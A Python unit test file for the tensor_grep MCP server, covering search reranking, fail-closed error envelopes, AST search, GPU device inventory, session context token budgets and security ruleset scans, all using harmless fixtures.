    """audit #95 Part 2: `rank` mirrors main.py's `--rank`/`--bm25` post-processing --
    inserted after _finalize_aggregate_result, before the empty/count/full-result branches
    (main.py's `elif config.rank_bm25 and all_results.matches:` ordering)."""
    from tensor_grep.cli import mcp_server

    fake_backend = _tg_search_rank_fixture()
    reranked = SearchResult(
        matches=[MatchLine(line_number=1, text="ERROR here", file="a.log")],
        matched_file_paths=["a.log"],
        total_files=1,
        total_matches=1,
    )
    with (
        patch("tensor_grep.cli.mcp_server.Pipeline") as mock_pipeline,
        patch("tensor_grep.cli.mcp_server.DirectoryScanner") as mock_scanner,
        patch("tensor_grep.core.reranker.rerank_by_bm25", return_value=reranked) as mock_rerank,
    ):
        pipeline = mock_pipeline.return_value
        pipeline.get_backend.return_value = fake_backend
        pipeline.selected_backend_name = "TorchBackend"
        pipeline.selected_backend_reason = "gpu_native"
        pipeline.selected_gpu_device_ids = []
        pipeline.selected_gpu_chunk_plan_mb = []
        mock_scanner.return_value.walk.return_value = ["a.log"]

        out = mcp_server.tg_search("ERROR", ".", rank=True)

    mock_rerank.assert_called_once()
    assert mock_rerank.call_args.args[0].total_matches == 1
    assert mock_rerank.call_args.args[1] == "ERROR"
    assert mock_rerank.call_args.args[2] == ["a.log"]
    payload = json.loads(out)
    assert payload["total_matches"] == 1


def test_tg_search_rank_corpus_cap_sets_fallback_reason(tmp_path, monkeypatch):
    """#128d (backlog cluster-1 P0-CORRECTNESS, MED-1): the MCP `rank=True` path funnels through
    the SAME reranker.py chokepoint as the CLI --rank path (cli/main.py:7222-7225 /
    cli/mcp_server.py:4258-4263 both call rerank_by_bm25 unmodified) -- a matched set exceeding
    the total chunk cap must bound chunking AND surface rank_fallback_reason in the MCP JSON
    envelope too. Unlike test_tg_search_rank_reranks_by_bm25 above, rerank_by_bm25 is NOT mocked
    here -- it runs for real (against real tmp_path files) to prove the cap actually applies on
    this call site, not just that the function gets called."""
    from tensor_grep.cli import mcp_server

    monkeypatch.setenv("TG_RANK_CORPUS_CHUNK_CAP", "1")
    monkeypatch.chdir(tmp_path)  # an in-root path so _confine_mcp_path's confinement check passes

    files = []
    for i in range(3):
        f = tmp_path / f"f{i}.py"
        f.write_text(f"def make_invoice_{i}(x):\n    return x\n", encoding="utf-8")
        files.append(str(f))

    def _search_result_for(current_file, *_args, **_kwargs):
        return SearchResult(
            matches=[MatchLine(line_number=1, text="def make_invoice", file=current_file)],
            matched_file_paths=[current_file],
            total_files=1,
            total_matches=1,
        )

    fake_backend = MagicMock()
    fake_backend.search.side_effect = _search_result_for

    with (
        patch("tensor_grep.cli.mcp_server.Pipeline") as mock_pipeline,
        patch("tensor_grep.cli.mcp_server.DirectoryScanner") as mock_scanner,
    ):
        pipeline = mock_pipeline.return_value
        pipeline.get_backend.return_value = fake_backend
        pipeline.selected_backend_name = "TorchBackend"
        pipeline.selected_backend_reason = "gpu_native"
        pipeline.selected_gpu_device_ids = []
        pipeline.selected_gpu_chunk_plan_mb = []
        mock_scanner.return_value.walk.return_value = files

        out = mcp_server.tg_search("invoice", str(tmp_path), rank=True)

    payload = json.loads(out)
    assert payload["total_matches"] == 3, f"expected all 3 matches preserved, got: {payload}"
    assert "corpus cap" in payload.get("rank_fallback_reason", "")


def test_tg_search_semantic_applies_hybrid_rerank(monkeypatch):
    from tensor_grep.cli import mcp_server

    fake_backend = _tg_search_rank_fixture()
    reranked = SearchResult(
        matches=[MatchLine(line_number=1, text="ERROR here", file="a.log")],
        matched_file_paths=["a.log"],
        total_files=1,
        total_matches=1,
        rank_fallback_reason=None,
    )
    with (
        patch("tensor_grep.cli.mcp_server.Pipeline") as mock_pipeline,
        patch("tensor_grep.cli.mcp_server.DirectoryScanner") as mock_scanner,
        patch(
            "tensor_grep.cli.mcp_server._apply_semantic_rerank", return_value=reranked
        ) as mock_semantic,
    ):
        pipeline = mock_pipeline.return_value
        pipeline.get_backend.return_value = fake_backend
        pipeline.selected_backend_name = "TorchBackend"
        pipeline.selected_backend_reason = "gpu_native"
        pipeline.selected_gpu_device_ids = []
        pipeline.selected_gpu_chunk_plan_mb = []
        mock_scanner.return_value.walk.return_value = ["a.log"]

        out = mcp_server.tg_search("ERROR", ".", semantic=True)

    mock_semantic.assert_called_once()
    assert mock_semantic.call_args.args[1] == "ERROR"
    payload = json.loads(out)
    assert payload["total_matches"] == 1


def test_tg_search_semantic_takes_priority_over_rank_when_both_set(monkeypatch):
    """Mirrors main.py's `if config.semantic_rank: ... elif config.rank_bm25:` ordering --
    semantic wins when both flags are requested; the BM25-only path must not also fire."""
    from tensor_grep.cli import mcp_server

    fake_backend = _tg_search_rank_fixture()
    reranked = SearchResult(
        matches=[MatchLine(line_number=1, text="ERROR here", file="a.log")],
        matched_file_paths=["a.log"],
        total_files=1,
        total_matches=1,
    )
    with (
        patch("tensor_grep.cli.mcp_server.Pipeline") as mock_pipeline,
        patch("tensor_grep.cli.mcp_server.DirectoryScanner") as mock_scanner,
        patch(
            "tensor_grep.cli.mcp_server._apply_semantic_rerank", return_value=reranked
        ) as mock_semantic,
        patch("tensor_grep.core.reranker.rerank_by_bm25") as mock_bm25,
    ):
        pipeline = mock_pipeline.return_value
        pipeline.get_backend.return_value = fake_backend
        pipeline.selected_backend_name = "TorchBackend"
        pipeline.selected_backend_reason = "gpu_native"
        pipeline.selected_gpu_device_ids = []
        pipeline.selected_gpu_chunk_plan_mb = []
        mock_scanner.return_value.walk.return_value = ["a.log"]

        mcp_server.tg_search("ERROR", ".", rank=True, semantic=True)

    mock_semantic.assert_called_once()
    mock_bm25.assert_not_called()


def test_tg_search_semantic_backend_execution_error_returns_distinguishable_error(monkeypatch):
    """Must catch BackendExecutionError EXPLICITLY (mirrors main.py's search_command boundary)
    -- a genuine dense-backend fault (corrupt model dir) must surface as a distinguishable
    structured error, not fall through to the generic internal_error catch-all at the bottom
    of tg_search (which would lose the fail-closed signal an agent needs to tell "the backend
    itself broke" apart from "some other internal_error")."""
    from tensor_grep.backends.base import BackendExecutionError
    from tensor_grep.cli import mcp_server

    fake_backend = _tg_search_rank_fixture()
    fault = BackendExecutionError("corrupt dense model directory")

    with (
        patch("tensor_grep.cli.mcp_server.Pipeline") as mock_pipeline,
        patch("tensor_grep.cli.mcp_server.DirectoryScanner") as mock_scanner,
        patch("tensor_grep.cli.mcp_server._apply_semantic_rerank", side_effect=fault),
    ):
        pipeline = mock_pipeline.return_value
        pipeline.get_backend.return_value = fake_backend
        pipeline.selected_backend_name = "TorchBackend"
        pipeline.selected_backend_reason = "gpu_native"
        pipeline.selected_gpu_device_ids = []
        pipeline.selected_gpu_chunk_plan_mb = []
        mock_scanner.return_value.walk.return_value = ["a.log"]

        out = mcp_server.tg_search("ERROR", ".", semantic=True)

    payload = json.loads(out)
    assert payload["error"]["code"] == "semantic_backend_error"
    assert payload["error"]["code"] != "internal_error"
    assert "corrupt dense model directory" in payload["error"]["message"]


def test_tg_search_semantic_probes_fallback_reason_on_empty_matches(monkeypatch):
    """F16 parity (main.py _set_semantic_rank_fallback_reason): even a 0-match search must
    still probe dense-leg availability so rank_fallback_reason is set whenever the leg is
    unavailable, regardless of match count."""
    from tensor_grep.cli import mcp_server

    fake_backend = MagicMock()
    fake_backend.search.return_value = SearchResult(matches=[], total_files=0, total_matches=0)

    with (
        patch("tensor_grep.cli.mcp_server.Pipeline") as mock_pipeline,
        patch("tensor_grep.cli.mcp_server.DirectoryScanner") as mock_scanner,
        patch("tensor_grep.cli.mcp_server._set_semantic_rank_fallback_reason") as mock_probe,
    ):
        pipeline = mock_pipeline.return_value
        pipeline.get_backend.return_value = fake_backend
        pipeline.selected_backend_name = "TorchBackend"
        pipeline.selected_backend_reason = "gpu_native"
        pipeline.selected_gpu_device_ids = []
        pipeline.selected_gpu_chunk_plan_mb = []
        mock_scanner.return_value.walk.return_value = ["a.log"]

        mcp_server.tg_search("NOPE", ".", semantic=True)

    mock_probe.assert_called_once()


def test_tg_search_rank_fallback_reason_surfaces_in_json_payload(monkeypatch):
    from tensor_grep.cli import mcp_server

    fake_backend = _tg_search_rank_fixture()
    reranked = SearchResult(
        matches=[MatchLine(line_number=1, text="ERROR here", file="a.log")],
        matched_file_paths=["a.log"],
        total_files=1,
        total_matches=1,
        rank_fallback_reason="semantic ranking unavailable: the `semantic` extra is not installed",
    )
    with (
        patch("tensor_grep.cli.mcp_server.Pipeline") as mock_pipeline,
        patch("tensor_grep.cli.mcp_server.DirectoryScanner") as mock_scanner,
        patch("tensor_grep.cli.mcp_server._apply_semantic_rerank", return_value=reranked),
    ):
        pipeline = mock_pipeline.return_value
        pipeline.get_backend.return_value = fake_backend
        pipeline.selected_backend_name = "TorchBackend"
        pipeline.selected_backend_reason = "gpu_native"
        pipeline.selected_gpu_device_ids = []
        pipeline.selected_gpu_chunk_plan_mb = []
        mock_scanner.return_value.walk.return_value = ["a.log"]

        out = mcp_server.tg_search("ERROR", ".", semantic=True)

    payload = json.loads(out)
    assert payload["rank_fallback_reason"] == (
        "semantic ranking unavailable: the `semantic` extra is not installed"
    )


def test_tg_search_docstring_does_not_oversell_gpu():
    """The docstring previously read 'high-speed GPU or CPU engine', overselling a paused,
    non-default, usually-dormant GPU path (architecture-contract known-weak-point #2: GPU is
    slower than CPU with no promotion-ready path; auto-GPU stays dormant when rg is
    installed). Mirror the CLI's own qualified phrasing ('with GPU acceleration when
    applicable') instead of an unqualified speed claim."""
    from tensor_grep.cli import mcp_server

    doc = mcp_server.tg_search.__doc__ or ""
    assert "high-speed GPU" not in doc
    assert "when applicable" in doc.lower()


def test_tg_ast_search_backend_execution_error_skips_file_and_keeps_partial_results():
    from tensor_grep.backends.base import BackendExecutionError
    from tensor_grep.cli import mcp_server

    fake_backend = type("AstGrepWrapperBackend", (), {"search": MagicMock()})()
    fake_backend.search.side_effect = [
        SearchResult(
            matches=[MatchLine(line_number=1, text="def foo(): pass", file="a.py")],
            matched_file_paths=["a.py"],
            total_files=1,
            total_matches=1,
        ),
        BackendExecutionError("ast-grep panic"),
    ]

    with (
        patch("tensor_grep.cli.mcp_server.Pipeline") as mock_pipeline,
        patch("tensor_grep.cli.mcp_server.DirectoryScanner") as mock_scanner,
    ):
        pipeline = mock_pipeline.return_value
        pipeline.get_backend.return_value = fake_backend
        pipeline.selected_backend_name = "AstGrepWrapperBackend"
        pipeline.selected_backend_reason = "ast_grep_json"
        pipeline.selected_gpu_device_ids = []
        pipeline.selected_gpu_chunk_plan_mb = []
        mock_scanner.return_value.walk.return_value = ["a.py", "b.py"]

        out = mcp_server.tg_ast_search("def $A():", "python", ".")

    payload = json.loads(out)
    # The first file's match survives; the faulted file is skipped (never silently
    # swapped to a regex-only CPU backend, which would misinterpret the AST pattern).
    assert payload["total_matches"] == 1
    assert payload["result_incomplete"] is True
    assert "b.py" in payload["incomplete_reason"]


def test_tg_ast_search_returns_structured_unavailable_when_pipeline_construction_raises(
    tmp_path, monkeypatch
):
    """Regression (CI 2026-07-10, PR #484): ``Pipeline(ast=True)`` construction itself raises
    ``ConfigurationError`` when the ast-grep/tree-sitter deps are absent for the pattern (e.g. a
    Linux runner without ast-grep) -- EARLIER than the backend-type check. tg_ast_search must
    fail closed with a STRUCTURED ``unavailable`` error, never let it escape as a raw FastMCP
    ToolError (Backend Fail-Closed Contract). Without the catch, a valid in-root call raised,
    which broke the confinement ratchet's positive (in-root-accepted) probe on Linux CI."""
    from tensor_grep.cli import mcp_server
    from tensor_grep.core.pipeline import ConfigurationError

    monkeypatch.chdir(tmp_path)  # an in-root path so the confinement check passes first
    with patch(
        "tensor_grep.cli.mcp_server.Pipeline",
        side_effect=ConfigurationError(
            "Explicit AST search requires AST dependencies: ast-grep wrapper backend is required"
        ),
    ):
        out = mcp_server.tg_ast_search("def $A():", "python", ".")

    payload = json.loads(out)
    assert payload["error"]["code"] == "unavailable"
    assert "not available" in payload["error"]["message"]


def test_tg_ast_search_fails_closed_for_metavariable_pattern_when_wrapper_unavailable(
    tmp_path, monkeypatch
):
    """Regression (#141 council-correction): unlike the sibling test above (which mocks
    ``Pipeline`` itself), this drives the REAL ``Pipeline`` with a genuine ast-grep metavariable
    pattern (``$NAME``) so the fail-closed refusal is proven end-to-end at the MCP entry path --
    ``Pipeline.__init__``, ``_supports_native_ast_pattern``, and
    ``_raise_explicit_ast_configuration_error`` (core/pipeline.py ~52-60, ~230-233) all run for
    real. Only the backend AVAILABILITY probes are stubbed (same technique as
    tests/unit/test_pipeline.py), with the native AstBackend left AVAILABLE to prove its presence
    never lets a metavariable pattern silently mis-route to it. Note: ``tg_ast_search``'s own
    ``Pipeline(config=config)`` construction (cli/mcp_server.py ~4629) never threads
    ``query_pattern`` into the ``SearchConfig`` it builds, so ``_supports_native_ast_pattern`` is
    unconditionally ``False`` there -- every AST pattern via this MCP tool requires the wrapper at
    this construction step, native ``AstBackend`` is structurally unreachable through it regardless
    of the caller's pattern. ``tg_ast_search`` (cli/mcp_server.py ~4630-4653) must catch the
    resulting ``ConfigurationError`` and return the structured "unavailable" JSON error, never a
    raw exception (Backend Fail-Closed Contract)."""
    from tensor_grep.cli import mcp_server

    monkeypatch.chdir(tmp_path)  # an in-root path so the confinement check passes first

    class _StubProbeBackend:
        def is_available(self):
            return True

    class _AvailableAstBackend:
        def is_available(self):
            return True

    class _UnavailableAstGrepWrapperBackend:
        def is_available(self):
            return False

    monkeypatch.setattr("tensor_grep.core.pipeline.RipgrepBackend", _StubProbeBackend)
    monkeypatch.setattr("tensor_grep.core.pipeline.RustCoreBackend", _StubProbeBackend)
    monkeypatch.setattr("tensor_grep.backends.ast_backend.AstBackend", _AvailableAstBackend)
    monkeypatch.setattr(
        "tensor_grep.backends.ast_wrapper_backend.AstGrepWrapperBackend",
        _UnavailableAstGrepWrapperBackend,
    )

    out = mcp_server.tg_ast_search("$NAME", "python", ".")

    payload = json.loads(out)
    assert payload["error"]["code"] == "unavailable"
    assert "not available" in payload["error"]["message"]


def test_tg_ast_search_refuses_vendored_root_scan_with_actionable_message(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    (tmp_path / "third_party").mkdir()

    fake_backend = type("AstGrepWrapperBackend", (), {"search": MagicMock()})()

    with patch("tensor_grep.cli.mcp_server.Pipeline") as mock_pipeline:
        pipeline = mock_pipeline.return_value
        pipeline.get_backend.return_value = fake_backend
        pipeline.selected_backend_name = "AstGrepWrapperBackend"
        pipeline.selected_backend_reason = "ast_grep_json"
        pipeline.selected_gpu_device_ids = []
        pipeline.selected_gpu_chunk_plan_mb = []

        out = mcp_server.tg_ast_search("def $A():", "python", str(tmp_path))

    fake_backend.search.assert_not_called()
    payload = json.loads(out)
    assert payload["error"]["code"] == "broad_scan_refused"
    assert payload["lang"] == "python"
    assert "third_party" in payload["error"]["message"]


def test_tg_devices_returns_no_gpu_message_when_empty():
    from tensor_grep.cli import mcp_server

    with patch(
        "tensor_grep.cli.mcp_server.collect_device_inventory",
        return_value=DeviceInventory(
            platform="windows",
            has_gpu=False,
            device_count=0,
            routable_device_ids=[],
            devices=[],
        ),
    ):
        out = mcp_server.tg_devices()

    # default is json_output=True; parse the JSON and assert no-GPU fields
    payload = json.loads(out)
    assert payload["has_gpu"] is False
    assert payload["device_count"] == 0
    assert payload["devices"] == []


def test_tg_devices_can_emit_json_payload():
    import json

    from tensor_grep.cli import mcp_server

    with patch(
        "tensor_grep.cli.mcp_server.collect_device_inventory",
        return_value=DeviceInventory(
            platform="windows",
            has_gpu=True,
            device_count=1,
            routable_device_ids=[7],
            devices=[DeviceInfo(device_id=7, vram_capacity_mb=12288)],
        ),
    ):
        out = mcp_server.tg_devices(json_output=True)

    payload = json.loads(out)
    assert payload["platform"] == "windows"
    assert payload["has_gpu"] is True
    assert payload["device_count"] == 1
    assert payload["devices"] == [{"device_id": 7, "vram_capacity_mb": 12288}]


def test_tg_devices_text_mode_returns_human_inventory_lines():
    from tensor_grep.cli import mcp_server

    with patch(
        "tensor_grep.cli.mcp_server.collect_device_inventory",
        return_value=DeviceInventory(
            platform="windows",
            has_gpu=True,
            device_count=2,
            routable_device_ids=[7, 3],
            devices=[
                DeviceInfo(device_id=7, vram_capacity_mb=12288),
                DeviceInfo(device_id=3, vram_capacity_mb=24576),
            ],
        ),
    ):
        out = mcp_server.tg_devices(json_output=False)

    assert "Detected 2 routable GPU(s):" in out
    assert "- gpu:7 vram_mb=12288" in out
    assert "- gpu:3 vram_mb=24576" in out


def test_tg_classify_logs_defaults_to_local_heuristics(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server

    class _ExplodingBackend:
        def __init__(self) -> None:
            raise AssertionError("MCP classify should not probe CyBERT by default")

    monkeypatch.chdir(tmp_path)  # cwd = the read-path confinement anchor (audit #81 #1)
    log_path = tmp_path / "app.log"
    log_path.write_text("INFO startup ok\nERROR database failed\n", encoding="utf-8")
    monkeypatch.delenv("TENSOR_GREP_CLASSIFY_PROVIDER", raising=False)
    monkeypatch.setitem(
        sys.modules,
        "tensor_grep.backends.cybert_backend",
        types.SimpleNamespace(CybertBackend=_ExplodingBackend),
    )

    out = mcp_server.tg_classify_logs(str(log_path))

    # default is structured_json=True; parse JSON and assert equivalent fields
    payload = json.loads(out)
    assert payload["provider"] == "heuristic"
    assert payload["provider_status"] == "local"
    anomaly_texts = [a["text"] for a in payload["anomalies"]]
    assert any("database failed" in t for t in anomaly_texts)
    anomaly_labels = [a["label"] for a in payload["anomalies"]]
    assert any("error" in lbl.lower() for lbl in anomaly_labels)


def test_tg_edit_plan_exposes_ranking_quality_and_coverage_summary(tmp_path: Path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    src_dir.mkdir(parents=True)
    (src_dir / "payments.py").write_text(
        "def create_invoice(total):\n    return total + 1\n",
        encoding="utf-8",
    )

    payload = json.loads(mcp_server.tg_edit_plan("create invoice", str(project)))

    assert payload["ranking_quality"] in {"strong", "moderate", "weak"}
    assert {"heuristic_fields", "parser_backed_fields", "graph_completeness"} <= set(
        payload["coverage_summary"]
    )
    assert {"parser_backed", "graph_derived", "heuristic"} <= set(
        payload["coverage_summary"]["evidence_counts"]
    )
    assert {"parser_backed", "graph_derived", "heuristic"} <= set(
        payload["coverage_summary"]["evidence_ratios"]
    )
    assert payload["coverage_summary"]["evidence_counts"]["parser_backed"] >= 1
    assert payload["graph_trust_summary"]["edge_kind"] == "reverse-import"
    assert payload["candidate_edit_targets"]["ranking_quality"] == payload["ranking_quality"]
    assert payload["candidate_edit_targets"]["coverage_summary"] == payload["coverage_summary"]
    assert payload["edit_plan_seed"]["dependency_trust"]["import_resolution_quality"] in {
        "strong",
        "moderate",
        "weak",
    }
    assert payload["edit_plan_seed"]["plan_trust_summary"]


def test_tg_session_context_supports_auto_refresh_alias(tmp_path: Path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server, session_store

    project = tmp_path / "project"
    src_dir = project / "src"
    src_dir.mkdir(parents=True)
    module_path = src_dir / "payments.py"
    module_path.write_text("def create_invoice():\n    return 1\n", encoding="utf-8")

    opened = session_store.open_session(str(project))
    module_path.write_text("def create_invoice():\n    return 2\n", encoding="utf-8")

    payload = json.loads(
        mcp_server.tg_session_context(
            opened.session_id,
            "invoice",
            str(project),
            auto_refresh=True,
        )
    )

    assert payload["routing_reason"] == "session-context"
    assert payload["files"] == [str(module_path.resolve())]


def test_tg_session_context_returns_uniform_error_detail(tmp_path: Path):
    from tensor_grep.cli import mcp_server

    missing_root = tmp_path / "missing"
    payload = json.loads(
        mcp_server.tg_session_context("session-missing", "invoice", str(missing_root))
    )

    assert payload["error"]["code"] == "invalid_input"
    assert "detail" in payload["error"]


def test_tg_session_context_default_max_tokens_matches_sibling_context_tools(
    tmp_path: Path, monkeypatch
):
    # H4: `tg_session_context` used to call `session_context` (-> `build_context_pack_from_map`)
    # with NO token bound at all, unlike every sibling context tool. It must now default to the
    # same `_DEFAULT_MCP_CONTEXT_MAX_TOKENS` and emit the `token_budget` field.
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    src_dir.mkdir(parents=True)
    (src_dir / "sample.py").write_text("def add(x):\n    return x\n", encoding="utf-8")

    opened = json.loads(mcp_server.tg_session_open(str(project)))
    session_id = opened["session_id"]

    payload = json.loads(mcp_server.tg_session_context(session_id, "add", str(project)))

    assert payload["token_budget"]["max_tokens"] == mcp_server._DEFAULT_MCP_CONTEXT_MAX_TOKENS
    assert payload["token_budget"]["truncated"] is False


def test_tg_session_context_bounds_pack_by_max_tokens(tmp_path: Path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    src_dir.mkdir(parents=True)
    for i in range(6):
        (src_dir / f"mod_{i}.py").write_text(
            f"def add_{i}(x):\n    return x + {i}\n" * 20,
            encoding="utf-8",
        )

    opened = json.loads(mcp_server.tg_session_open(str(project)))
    session_id = opened["session_id"]

    unbounded = json.loads(
        mcp_server.tg_session_context(session_id, "add", str(project), max_tokens=0)
    )
    bounded = json.loads(
        mcp_server.tg_session_context(session_id, "add", str(project), max_tokens=50)
    )

    # 0 = explicit unbounded opt-out (matches every sibling context tool's contract).
    assert "token_budget" not in unbounded
    assert bounded["token_budget"]["max_tokens"] == 50
    assert bounded["token_budget"]["truncated"] is True
    assert len(bounded["files"]) < len(unbounded["files"])


def test_tg_session_lifecycle_errors_return_uniform_error_detail(tmp_path: Path):
    from tensor_grep.cli import mcp_server

    with (
        patch(
            "tensor_grep.cli.session_store.open_session", side_effect=RuntimeError("open failed")
        ),
        patch(
            "tensor_grep.cli.session_store.list_sessions", side_effect=RuntimeError("list failed")
        ),
        patch("tensor_grep.cli.session_store.get_session", side_effect=RuntimeError("show failed")),
        patch(
            "tensor_grep.cli.session_store.refresh_session",
            side_effect=RuntimeError("refresh failed"),
        ),
    ):
        opened = json.loads(mcp_server.tg_session_open(str(tmp_path)))
        listed = json.loads(mcp_server.tg_session_list(str(tmp_path)))
        shown = json.loads(mcp_server.tg_session_show("session-missing", str(tmp_path)))
        refreshed = json.loads(mcp_server.tg_session_refresh("session-missing", str(tmp_path)))

        for payload in (opened, listed, shown, refreshed):
            assert payload["error"]["code"] == "invalid_input"
            assert "detail" in payload["error"]


def test_tg_session_open_accepts_initial_repo_map_cap(tmp_path: Path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    src_dir.mkdir(parents=True)
    for index in range(4):
        (src_dir / f"module_{index}.py").write_text(
            f"def function_{index}():\n    return {index}\n",
            encoding="utf-8",
        )

    payload = json.loads(mcp_server.tg_session_open(str(project), max_repo_files=2))

    assert payload["schema_version"] == payload["version"]
    assert payload["file_count"] == 2
    assert payload["symbol_count"] == 2
    assert payload["scan_limit"]["max_repo_files"] == 2
    assert payload["scan_limit"]["possibly_truncated"] is True
    assert payload["build_seconds"] >= 0


def test_tg_session_open_defaults_to_agent_safe_repo_map_cap(tmp_path: Path, monkeypatch):
    # #98: the default cap was raised 512 -> 2000 (mcp_server._DEFAULT_MCP_REPO_SCAN_LIMIT) so
    # tg_session_open matches every sibling MCP scan tool. Create more than 2000 files so the
    # truncation behavior at the new default cap is still exercised end-to-end (not just the
    # signature default -- see test_mcp_context_default_cap.py for the signature-level pin).
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    project = tmp_path / "project"
    src_dir = project / "src"
    src_dir.mkdir(parents=True)
    for index in range(2005):
        (src_dir / f"module_{index:04}.py").write_text(
            f"def function_{index}():\n    return {index}\n",
            encoding="utf-8",
        )

    payload = json.loads(mcp_server.tg_session_open(str(project)))

    assert payload["file_count"] == mcp_server._DEFAULT_MCP_REPO_SCAN_LIMIT == 2000
    assert payload["scan_limit"]["max_repo_files"] == mcp_server._DEFAULT_MCP_REPO_SCAN_LIMIT
    assert payload["scan_limit"]["possibly_truncated"] is True


def test_tg_rulesets_returns_builtin_ruleset_metadata():
    from tensor_grep.cli import mcp_server

    payload = json.loads(mcp_server.tg_rulesets())
    assert payload["routing_reason"] == "builtin-rulesets"
    rulesets = {ruleset["name"]: ruleset for ruleset in payload["rulesets"]}
    assert set(rulesets) == {
        "auth-safe",
        "crypto-safe",
        "deserialization-safe",
        "secrets-basic",
        "subprocess-safe",
        "tls-safe",
    }
    assert rulesets["auth-safe"]["category"] == "security"
    assert "python" in rulesets["auth-safe"]["languages"]


def test_tg_ruleset_scan_returns_structured_findings(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server
    from tests.unit.test_cli_modes import _FakeAstPipeline, _FakeAstScanner

    monkeypatch.setattr("tensor_grep.core.pipeline.Pipeline", _FakeAstPipeline)
    monkeypatch.setattr("tensor_grep.io.directory_scanner.DirectoryScanner", _FakeAstScanner)
    monkeypatch.chdir(tmp_path)

    Path("a.py").write_text("hashlib.md5($$$ARGS)\n", encoding="utf-8")
    Path("b.py").write_text("ok\n", encoding="utf-8")

    payload = json.loads(mcp_server.tg_ruleset_scan("crypto-safe", path=".", language="python"))

    assert payload["routing_reason"] == "builtin-ruleset-scan"
    assert payload["ruleset"] == "crypto-safe"
    assert payload["rule_count"] == 2
    assert payload["matched_rules"] == 1
    assert payload["total_matches"] == 1
    assert payload["findings"][0]["rule_id"] == "python-hashlib-md5"
    assert payload["findings"][0]["severity"] == "high"
    assert "hashlib.md5" in payload["findings"][0]["message"]
    assert (
        payload["findings"][0]["fingerprint"]
        == hashlib.sha256(
            json.dumps(
                {
                    "rule_id": "python-hashlib-md5",
                    "language": "python",
                    "files": ["a.py"],
                },
                sort_keys=True,
            ).encode("utf-8")
        ).hexdigest()
    )
    assert payload["findings"][0]["files"] == ["a.py"]
    assert payload["findings"][0]["evidence"] == [{"file": "a.py", "match_count": 1}]


# audit #95 Part 2 [SEC]: `inline_rules` on tg_ruleset_scan -- the `--inline-rules` CLI source
# (a string of ast-grep rule YAML, ZERO file I/O), mirrored via _load_inline_rule_specs (never
# reimplemented). `ruleset` becomes optional; exactly one of ruleset/inline_rules is required.


def test_tg_ruleset_scan_supports_inline_rules(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server
    from tests.unit.test_cli_modes import _FakeAstPipeline, _FakeAstScanner

    monkeypatch.setattr("tensor_grep.core.pipeline.Pipeline", _FakeAstPipeline)
    monkeypatch.setattr("tensor_grep.io.directory_scanner.DirectoryScanner", _FakeAstScanner)
    monkeypatch.chdir(tmp_path)

    Path("a.py").write_text("print($A)\n", encoding="utf-8")
    Path("b.py").write_text("ok\n", encoding="utf-8")

    inline_rules = "\n".join([
        "id: no-print",
        "language: python",
        "rule:",
        "  pattern: print($A)",
    ])

    payload = json.loads(mcp_server.tg_ruleset_scan(inline_rules=inline_rules, path="."))

    assert payload["routing_reason"] == "ast-inline-rules-scan"
    assert payload["config_path"] == "inline-rules"
    assert payload["ruleset"] is None
    assert payload["rule_count"] == 1
    assert payload["matched_rules"] == 1
    assert payload["findings"][0]["rule_id"] == "no-print"
    assert payload["findings"][0]["files"] == ["a.py"]


def test_tg_ruleset_scan_inline_rules_preserves_severity_and_message(monkeypatch, tmp_path):
    from tensor_grep.cli import mcp_server
    from tests.unit.test_cli_modes import _FakeAstPipeline, _FakeAstScanner

    monkeypatch.setattr("tensor_grep.core.pipeline.Pipeline", _FakeAstPipeline)
    monkeypatch.setattr("tensor_grep.io.directory_scanner.DirectoryScanner", _FakeAstScanner)
    monkeypatch.chdir(tmp_path)

    Path("a.py").write_text("print($A)\n", encoding="utf-8")

    inline_rules = "\n".join([
        "id: no-print",
        "language: python",
        "severity: warning",
        "message: Avoid print in library code.",
        "rule:",
        "  pattern: print($A)",
    ])

    payload = json.loads(mcp_server.tg_ruleset_scan(inline_rules=inline_rules, path="."))

    finding = payload["findings"][0]
    assert finding["rule_id"] == "no-print"
    assert finding["severity"] == "warning"
    assert finding["message"] == "Avoid print in library code."


def test_tg_ruleset_scan_ruleset_and_inline_rules_are_mutually_exclusive(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    payload = json.loads(
        mcp_server.tg_ruleset_scan(
            ruleset="crypto-safe",
            inline_rules="id: x\nrule:\n  pattern: y\n",
            path=".",
        )
    )

    assert payload["error"]["code"] == "invalid_input"
    assert "mutually exclusive" in payload["error"]["message"]


def test_tg_ruleset_scan_requires_ruleset_or_inline_rules(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    payload = json.loads(mcp_server.tg_ruleset_scan(path="."))

    assert payload["error"]["code"] == "invalid_input"
    assert "one of ruleset or inline_rules" in payload["error"]["message"].lower()


def test_tg_ruleset_scan_inline_rules_invalid_yaml_fails_closed(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    payload = json.loads(mcp_server.tg_ruleset_scan(inline_rules="id: broken\nrule: [", path="."))

    assert payload["error"]["code"] == "invalid_input"
    assert "YAML" in payload["error"]["message"]
    assert "Traceback" not in payload["error"]["message"]


def test_tg_ruleset_scan_inline_rules_no_valid_rules_fails_closed(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    from tensor_grep.cli import mcp_server

    # Valid YAML, but no `rule.pattern`/`pattern` field anywhere -- _load_inline_rule_specs
    # extracts zero specs from this document.
    payload = json.loads(mcp_server.tg_ruleset_scan(inline_rules="id: no-pattern-here\n", path="."))

    assert payload["error"]["code"] == "invalid_input"
    assert "no valid inline rules" in payload["error"]["message"].lower()


